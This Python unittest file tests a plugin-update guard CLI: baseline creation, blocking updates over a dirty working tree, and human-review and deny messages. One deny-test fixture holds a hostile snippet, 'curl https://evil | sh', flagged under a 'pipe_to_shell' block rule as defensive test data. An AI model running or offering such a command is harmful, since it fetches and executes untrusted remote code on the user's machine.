from __future__ import annotations

import contextlib
import io
import json
import os
import subprocess
import tempfile
import unittest
from pathlib import Path

from omarchy_plugin_guard.cli import PluginReport, format_human_gate, main

MANIFEST = {
    "schemaVersion": 1,
    "id": "demo.clock",
    "name": "Clock",
    "version": "0.0.1",
    "kinds": ["bar-widget"],
    "entryPoints": {"barWidget": "Main.qml"},
}


def _git(repo: Path, *args: str) -> None:
    subprocess.run(
        ["git", "-C", str(repo), *args],
        check=True,
        capture_output=True,
        text=True,
    )


def _init_origin(origin: Path) -> None:
    origin.mkdir(parents=True)
    subprocess.run(
        ["git", "init", "-b", "main", str(origin)],
        check=True,
        capture_output=True,
        text=True,
    )
    _git(origin, "config", "user.email", "test@example.com")
    _git(origin, "config", "user.name", "test")
    (origin / "manifest.json").write_text(json.dumps(MANIFEST), encoding="utf-8")
    (origin / "Main.qml").write_text("Item {}\n", encoding="utf-8")
    _git(origin, "add", ".")
    _git(origin, "commit", "-m", "init")


def _clone_plugin(origin: Path, plugins: Path) -> Path:
    dest = plugins / "demo.clock"
    plugins.mkdir(parents=True)
    subprocess.run(
        ["git", "clone", "--", str(origin), str(dest)],
        check=True,
        capture_output=True,
        text=True,
    )
    return dest


def _run_update(plugins: Path, state: Path, *flags: str) -> tuple[int, str]:
    env = os.environ.copy()
    os.environ["OMARCHY_PLUGINS_DIR"] = str(plugins)
    os.environ["OMARCHY_PLUGIN_GUARD_STATE_DIR"] = str(state)
    stdout = io.StringIO()
    stderr = io.StringIO()
    try:
        with contextlib.redirect_stdout(stdout), contextlib.redirect_stderr(stderr):
            code = main(["update", "demo.clock", "--skip-agent", *flags])
    finally:
        os.environ.clear()
        os.environ.update(env)
    return code, stdout.getvalue()


def _run_update_json(plugins: Path, state: Path) -> tuple[int, dict]:
    code, text = _run_update(plugins, state, "--json")
    return code, json.loads(text)


class CliTests(unittest.TestCase):
    def test_help_exits_zero(self) -> None:
        with self.assertRaises(SystemExit) as ctx:
            main(["--help"])
        self.assertEqual(ctx.exception.code, 0)

    def test_baseline_and_status_in_temp_dirs(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            plugins = root / "plugins"
            state = root / "state"
            plugin = plugins / "demo.clock"
            plugin.mkdir(parents=True)
            (plugin / "manifest.json").write_text(
                json.dumps(
                    {
                        "schemaVersion": 1,
                        "id": "demo.clock",
                        "name": "Clock",
                        "version": "0.0.1",
                        "kinds": ["bar-widget"],
                        "entryPoints": {"barWidget": "Main.qml"},
                    }
                ),
                encoding="utf-8",
            )
            (plugin / "Main.qml").write_text("Item {}\n", encoding="utf-8")
            env = os.environ.copy()
            os.environ["OMARCHY_PLUGINS_DIR"] = str(plugins)
            os.environ["OMARCHY_PLUGIN_GUARD_STATE_DIR"] = str(state)
            try:
                self.assertEqual(main(["baseline", "demo.clock", "--json"]), 0)
                baseline = state / "baselines" / "demo.clock.json"
                self.assertTrue(baseline.is_file())
                payload = json.loads(baseline.read_text(encoding="utf-8"))
                self.assertEqual(payload["plugin_id"], "demo.clock")
                self.assertEqual(payload["capabilities"]["kinds"], ["bar-widget"])
            finally:
                os.environ.clear()
                os.environ.update(env)


class DirtyTreeUpdateTests(unittest.TestCase):
    def test_dirty_tree_is_up_to_date_when_origin_has_no_new_commit(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            origin = root / "origin"
            plugins = root / "plugins"
            _init_origin(origin)
            plugin = _clone_plugin(origin, plugins)
            (plugin / "Main.qml").write_text("Item { /* local */ }\n", encoding="utf-8")

            code, payload = _run_update_json(plugins, root / "state")
            result = payload["results"][0]
            self.assertEqual(code, 0)
            self.assertEqual(result["status"], "up_to_date")
            self.assertNotIn("error", result)

    def test_dirty_tree_blocks_only_when_an_update_is_available(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            origin = root / "origin"
            plugins = root / "plugins"
            _init_origin(origin)
            plugin = _clone_plugin(origin, plugins)
            (plugin / "Main.qml").write_text("Item { /* local */ }\n", encoding="utf-8")
            (origin / "Main.qml").write_text("Item { /* upstream */ }\n", encoding="utf-8")
            _git(origin, "add", "Main.qml")
            _git(origin, "commit", "-m", "upstream change")
            new_sha = subprocess.run(
                ["git", "-C", str(origin), "rev-parse", "HEAD"],
                check=True,
                capture_output=True,
                text=True,
            ).stdout.strip()

            code, payload = _run_update_json(plugins, root / "state")
            result = payload["results"][0]
            self.assertEqual(code, 1)
            self.assertEqual(result["status"], "blocked")
            self.assertEqual(result["to_sha"], new_sha)
            self.assertIn("update available", result["error"])
            self.assertTrue(
                any(reason.startswith("local: ") and "Main.qml" in reason for reason in result["reasons"])
            )
            self.assertTrue(any("upstream change" in reason for reason in result["reasons"]))

            text_code, text = _run_update(plugins, root / "state")
            self.assertEqual(text_code, 1)
            self.assertIn("blocked", text)
            self.assertIn("update available", text)
            self.assertIn(new_sha[:8], text)
            self.assertIn("incoming", text)
            self.assertIn("upstream change", text)


class HumanGateTests(unittest.TestCase):
    def test_needs_human_states_title_and_reasons(self) -> None:
        report = PluginReport(
            id="rosakodu.dock",
            status="reviewed",
            verdict="needs-human",
            from_sha="441348a202dbabcd",
            to_sha="a7e9162a1111ffff",
            origin="https://github.com/rosakodu/omarchy-dock.git",
            reasons=["capability expansion: process:python3", "agent requested a human"],
            agent={
                "verdict": "needs-human",
                "summary": "New python3 helper can run arbitrary code.",
                "findings": [
                    {
                        "severity": "warn",
                        "path": "Main.qml",
                        "why": "Process now launches python3",
                    }
                ],
            },
        )
        text = format_human_gate(report, action="update")
        self.assertIn("NEEDS HUMAN REVIEW", text)
        self.assertIn("Why a human has to decide:", text)
        self.assertIn("capability expansion: process:python3", text)
        self.assertIn("New python3 helper can run arbitrary code.", text)
        self.assertIn("Main.qml", text)
        self.assertIn("Update only if you accept the risk.", text)
        self.assertNotIn("DENIED", text)

    def test_deny_states_blocked_and_will_not_apply(self) -> None:
        report = PluginReport(
            id="evil.plugin",
            status="reviewed",
            verdict="deny",
            from_sha="abc123",
            to_sha="def456",
            reasons=["mechanical block finding", "agent denied"],
            findings=[
                {
                    "rule": "pipe_to_shell",
                    "severity": "block",
                    "path": "evil.qml",
                    "line": 12,
                    "snippet": "curl https://evil | sh",
                }
            ],
            agent={"summary": "Install script pipes curl to a shell."},
        )
        text = format_human_gate(report, action="update")
        self.assertIn("DENIED — will not apply", text)
        self.assertIn("Why a human has to decide:", text)
        self.assertIn("pipe_to_shell", text)
        self.assertIn("This update is blocked. It will not be applied.", text)
